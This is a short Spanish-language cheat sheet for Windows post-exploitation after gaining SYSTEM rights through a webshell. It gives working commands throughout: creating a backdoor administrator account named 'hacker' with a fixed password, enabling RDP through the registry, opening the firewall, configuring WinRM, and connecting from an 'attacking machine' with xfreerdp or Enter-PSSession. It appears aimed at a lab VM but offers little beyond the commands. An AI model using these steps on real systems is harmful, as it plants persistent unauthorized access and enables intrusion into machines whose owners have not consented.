**Elevación de privilegios y creación de usuario administrador en Windows con SYSTEM**

---

### 1. Verificación del contexto SYSTEM

* Webserver corre como SYSTEM (máximo privilegio local).
* Shell con privilegios SYSTEM o ejecución de comandos con esos permisos.

---

### 2. Crear nuevo usuario local

Ejecutar en shell o desde webshell con comandos:

```cmd
net user hacker P@ssw0rd123! /add
```

* `hacker`: nombre de usuario nuevo.
* `P@ssw0rd123!`: contraseña segura (modificar según criterio).

---

### 3. Agregar usuario a grupo "Administrators"

```cmd
net localgroup administrators hacker /add
```

* Permite al usuario `hacker` permisos de administrador local.

---

### 4. Verificar usuario y grupo

```cmd
net user hacker
net localgroup administrators
```

---

### 5. Habilitar RDP (si es necesario)

```powershell
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

* Permite conexiones RDP.

---

### 6. Abrir puerto RDP en firewall (puerto 3389)

```powershell
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

---

### 7. Conexión RDP

* Desde máquina atacante, iniciar sesión RDP con usuario y contraseña creados.
* Comando para conexión:

```bash
xfreerdp /u:hacker /p:P@ssw0rd123! /v:<IP-Windows-VM>
```

---

### 8. Alternativa: Usar WinRM para conexión remota PowerShell

* Configurar WinRM si no está habilitado:

```powershell
winrm quickconfig -q
winrm set winrm/config/winrs @{MaxMemoryPerShellMB="512"}
winrm set winrm/config @{MaxTimeoutms="1800000"}
```

* Desde atacante, conectar con `winrs` o `Enter-PSSession` (PowerShell Remoting):

```powershell
Enter-PSSession -ComputerName <IP> -Credential hacker
```

---

### 9. Seguridad y limpieza

* Después de la sesión, eliminar usuario si es necesario:

```cmd
net user hacker /delete
```

---
